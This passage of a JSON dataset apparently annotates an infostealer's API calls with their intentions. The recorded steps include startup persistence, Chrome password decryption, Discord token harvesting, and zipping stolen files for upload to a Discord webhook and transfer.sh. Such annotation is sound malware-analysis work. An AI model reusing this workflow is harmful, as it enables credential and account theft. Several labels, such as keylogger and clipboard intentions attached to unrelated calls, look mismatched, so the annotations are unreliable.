              "action_id": "delete_file",
              "object": "startup_path + argv[0]",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "argv[0], startup_path",
              "object_description": "Local file and temporary file path",
              "object_id": "local_file_with_temp",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "tp",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "tp + i",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "config, errors=\"ignore\"",
              "object_description": "Configuration file",
              "object_id": "",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "json.load()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "f",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "config, 'w'",
              "object_description": "Configuration file",
              "object_id": "",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "json.dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "item, f, indent=2, sort_keys=True",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "config, 'a'",
              "object_description": "Configuration file",
              "object_id": "",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"\\n\\n//KEKWLTD | https://kekwltd.ru\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "Process name",
              "object_id": "",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "System process",
              "object_id": "system_process",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "ntpath.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "bd",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "bd, 'r', encoding=\"cp437\", errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "f.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "bd, 'w', newline='', encoding=\"cp437\", errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "fp.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "content",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "self.roaming + f'\\{disc}\\Local State'",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "f'{path}\\{filname}', errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "y.split('dQw4w9WgXcQ:')[1]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "self.get_master_key()",
              "action_description": "Retrieves and decrypts master key from local state",
              "action_id": "get_master_key",
              "object": "self.roaming + f'\\{disc}\\Local State'",
              "object_description": "Chrome local state file",
              "object_id": "chrome_local_state_file",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "self.decrypt_val()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State')",
              "object_description": "Decompressed data and codec key",
              "object_id": "decompressed_data_with_key",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.baseurl, headers={...}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "r.status_code",
              "action_description": "Retrieves HTTP response status code",
              "action_id": "get_http_status",
              "object": "",
              "object_description": "Status code",
              "object_id": "status_code",
              "intention_description": "Extract file upload response",
              "intention_id": "extract_file_upload_response"
            },
            {
              "action_api": "r.json()",
              "action_description": "Deserializes JSON response body to Python object",
              "action_id": "deserialize_json_response",
              "object": "",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.dir + \"\\Discord_Info.txt\", \"w\", encoding=\"cp437\", errors='ignore'",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "f\"{' '*17}{user}\\n{'-'*50}\\nBilling?: {billing}\\nNitro: {has_nitro}\\nBadges: {badges}\\nPhone: {phone}\\nToken: {token}\\nEmail: {email}\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "self.dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, \"r\", errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "ff.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, \"w\", encoding=\"utf-8\", errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "\"KEKWLTD | https://kekwltd.ru\\n\\n\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "path, \"a\", encoding=\"utf-8\", errors=\"ignore\"",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "fp.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "x + \"\\n\\nKEKWLTD | https://kekwltd.ru\"",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "zipfile.ZipFile()",
              "action_description": "Creates new ZIP archive for writing",
              "action_id": "create_zip_archive",
              "object": "_zipfile, \"w\", zipfile.ZIP_DEFLATED",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Create zip archive",
              "intention_id": "create_zip_archive"
            },
            {
              "action_api": "os.walk()",
              "action_description": "Directory tree generation",
              "action_id": "path_special_operations",
              "object": "self.dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Prepare directory path",
              "intention_id": "prepare_directory_path"
            },
            {
              "action_api": "zipped_file.write()",
              "action_description": "Adds file to ZIP archive with specified archive name",
              "action_id": "add_file_zip",
              "object": "absname, arcname",
              "object_description": "Local file or directory name",
              "object_id": "local_file_or_directory_name",
              "intention_description": "Add file to zip archive",
              "intention_id": "add_file_to_archive"
            },
            {
              "action_api": "zipped_file.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "_zipfile, 'rb'",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Access file content",
              "intention_id": "access_file_content"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, json=embed",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "httpx.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.discord_webhook, files={'upload_file': f}",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "_zipfile",
              "object_description": "ZIP archive file",
              "object_id": "zip_archive",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=func, daemon=True",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "process.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            },
            {
              "action_api": "t.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "os.system()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "winreg.OpenKey()",
              "action_description": "Opens registry key",
              "action_id": "open_registry_key",
              "object": "winreg.HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum'",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "winreg.QueryValueEx()",
              "action_description": "Retrieves value and data type for registry value",
              "action_id": "get_registry_value",
              "object": "handle, '0'",
              "object_description": "Registry value",
              "object_id": "registry_value",
              "intention_description": "Access registry value",
              "intention_id": "access_registry_value"
            },
            {
              "action_api": "winreg.CloseKey()",
              "action_description": "Closes the opened registry key",
              "action_id": "close_registry_key",
              "object": "handle",
              "object_description": "Registry key handle",
              "object_id": "registry_key_handle",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "asyncio.run()",
              "action_description": "Runs asynchronous function until completion",
              "action_id": "run_async_function",
              "object": "bc_initial_func().init()",
              "object_description": "Function and arguments",
              "object_id": "function_with_arguments",
              "intention_description": "Trigger main behavioral logic",
              "intention_id": "trigger_main_behavioral_logic"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'LOCALAPPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'APPDATA'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "'TEMP'",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=getPassw, args=[patt[0], patt[3]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=getCookie, args=[patt[0], patt[4]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "Trust()",
              "action_description": "Compiles regular expression pattern",
              "action_id": "compile_regex",
              "object": "Cookies",
              "object_description": "Cookie data string",
              "object_id": "cookie_data_string",
              "intention_description": "Detect cryptocurrency address in clipboard",
              "intention_id": "detect_cryptocurrency_address_clipboard"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ZipThings, args=[patt[0], patt[5], patt[1]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=ZipThings, args=[patt[0], patt[2], patt[1]]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "requests.post()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "https://transfer.sh/, files=files",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "pathF",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "pathF + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "path",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "path + \"/\" + file",
              "object_description": "Local file",
              "object_id": "local_file",
              "intention_description": "Determine file presence",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "path + \"/\" + file",
              "object_description": "Custom directory",
              "object_id": "custom_directory",
              "intention_description": "Determine directory presence",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=bc_create_file, args=[patt, key_wordsFiles]",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "thread.join()",
              "action_description": "Waits for thread to finish execution",
              "action_id": "wait_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Wait for keylogger thread to finish",
              "intention_id": "wait_keylogger_thread_finish"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "0.2",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "upload()",
              "action_description": "Uploads file to transfer.sh and returns URL",
              "action_id": "upload_file_transfer_sh",
              "object": "\"bc_checking\", filetext",
              "object_description": "File sharing endpoint",
              "object_id": "file_sharing_endpoint",
              "intention_description": "Send file data to server",
              "intention_id": "send_file_data_server"
            },
            {
              "action_api": "threading.Thread()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "target=auto_copy_wallet().run",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Run function in thread pool",
              "intention_id": "run_function_thread_pool"
            },
            {
              "action_api": "auto.start()",
              "action_description": "Starts thread execution",
              "action_id": "start_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Start keylogger in new thread",
              "intention_id": "start_keylogger_thread"
            }
          ]
        }
      ]
    }
  ]
}